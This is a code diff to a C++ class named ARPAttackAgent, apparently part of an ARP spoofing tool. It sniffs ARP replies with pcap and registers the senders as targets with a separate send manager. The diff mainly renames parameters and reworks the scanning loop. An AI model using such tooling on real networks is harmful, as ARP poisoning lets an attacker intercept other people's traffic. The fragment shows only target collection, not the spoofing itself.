@@ -1,13 +1,12 @@
-#pragma once
-
 #include <optional>
 #include <netinet/in.h>
+#include <iostream>
 #include "arp/SendARPManager.cpp"
 
 class ARPAttackAgent {
 private:
     char* netInterface;
-    uint8_t* senderIP;
+    uint8_t* targetIP;
 
     bool isBroadcast = false;
     uint8_t* singleClient;
@@ -20,9 +19,7 @@ private:
             if (arpHeader->op_code == ARP_OPCODE_REPLY) {
                 if (this->isBroadcast or this->singleClient == arpHeader->sender_ip) {
                     return arpHeader;
-                } else {
-                    return {};
-                }
+                } else return {};
             }
         }
         return {};
@@ -30,18 +27,18 @@ private:
 public:
     const static int UNLIMITED = 0;
 
-    ARPAttackAgent(char* netInterface, uint8_t* senderIP, std::optional<uint8_t*> targetMAC):
-    netInterface(netInterface), senderIP(senderIP) {
-        if (!targetMAC) isBroadcast = true;
-        else this->singleClient = senderIP;
+    ARPAttackAgent(char* netInterface, uint8_t* targetIP, std::optional<uint8_t*> senderIP):
+    netInterface(netInterface), targetIP(targetIP) {
+        if (!senderIP) this->isBroadcast = true;
+        else this->singleClient = senderIP.value();
 
         this->sendArpManager = SendARPManager();
     }
 
     void scanClients() {
         std::cout << "INFO: Start scanning sender clients..." << std::endl;
-        char errBuf[PCAP_ERRBUF_SIZE];
 
+        char errBuf[PCAP_ERRBUF_SIZE];
         pcap_t* handle = pcap_open_live(netInterface, BUFSIZ, 1, 1000, errBuf);
         auto go = true;
         while (go) {
@@ -51,12 +48,12 @@ public:
 
             auto arpHeader = this->processARPPacket(packet);
 
-            if (!arpHeader) {
-                return;
-            } else this->sendArpManager.addARPTarget(arpHeader.value());
-
-            std::cout << "Collected ARP sender: " << arpHeader.value()->sender_ip << std::endl;
-            go = false;
+            if (arpHeader) {
+                if (this->sendArpManager.addARPTarget(arpHeader.value())) {
+                    std::cout << "INFO: Collected ARP sender: " << arpHeader.value()->sender_ip << std::endl;
+                    go = false;
+                }
+            }
         }
 
         std::cout << "INFO: Success scanning sender clients" << std::endl;
